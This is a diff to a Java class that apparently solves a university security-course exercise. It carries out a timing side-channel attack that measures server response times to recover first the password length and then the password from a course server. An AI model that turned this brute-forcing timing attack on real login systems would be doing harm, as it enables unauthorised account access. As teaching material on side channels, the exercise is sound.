@@ -1,8 +1,8 @@
 import java.io.IOException;
+import java.io.InputStream;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.net.URLConnection;
-import java.nio.charset.StandardCharsets;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -28,10 +28,17 @@ public class ex01_M1 {
         try {
             URL site = new URL(url);
             URLConnection conn = site.openConnection();
+            conn.setDoInput(true);
+
             start = getCurrentTime();
             conn.connect();
             end = getCurrentTime();
-            String body = new String(conn.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
+
+            InputStream stream = conn.getInputStream();
+            byte[] bytesBody={0};
+            stream.read(bytesBody);
+            String body = new String(bytesBody);
+
             if("1".equals(body)){
                 System.out.println(url);
                 return FOUND_THE_PASSWORD;
@@ -48,8 +55,8 @@ public class ex01_M1 {
     }
 
     public static int checkPasswordLength(String url) {
-        Map<Integer, Long> passwordLengthToSumTime =  new HashMap<>();
-        Map<Integer, Integer> passwordLengthAttempts =  new HashMap<>();
+        Map<Integer, Long> passwordLengthToSumTime =  new HashMap<Integer, Long>();
+        Map<Integer, Integer> passwordLengthAttempts =  new HashMap<Integer, Integer>();
         Map<Integer, String> passwordStrings =  new HashMap<Integer, String>();
         for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++)
         {
@@ -164,10 +171,21 @@ public class ex01_M1 {
         // first call to do some setup in java:
         checkResponseTime("http://aoi.ise.bgu.ac.il/?user=ID&password=1234&difficulty=1");
 
-        int passwordLength = checkPasswordLength("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1");
-        System.out.println(String.format("Password length is %d", passwordLength));
+        long responseTime = 0;
+        int passwordLength;
+        String urlWithPassword = "";
+        while(responseTime != FOUND_THE_PASSWORD)
+        {
+            passwordLength = checkPasswordLength("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1");
+            System.out.println(String.format("Password length is %d", passwordLength));
 
-        String password = checkThePassword("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1", passwordLength);
-        System.out.println(String.format("The password is %s", password));
+            urlWithPassword = checkThePassword("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1", passwordLength);
+            System.out.println(String.format("The password is %s", urlWithPassword));
+
+            responseTime = checkResponseTime(urlWithPassword);
+        }
+
+        System.out.println(String.format("The REAL password is %s", urlWithPassword));
+        System.out.println(String.format("The REAL password is %s", urlWithPassword));
     }
 }
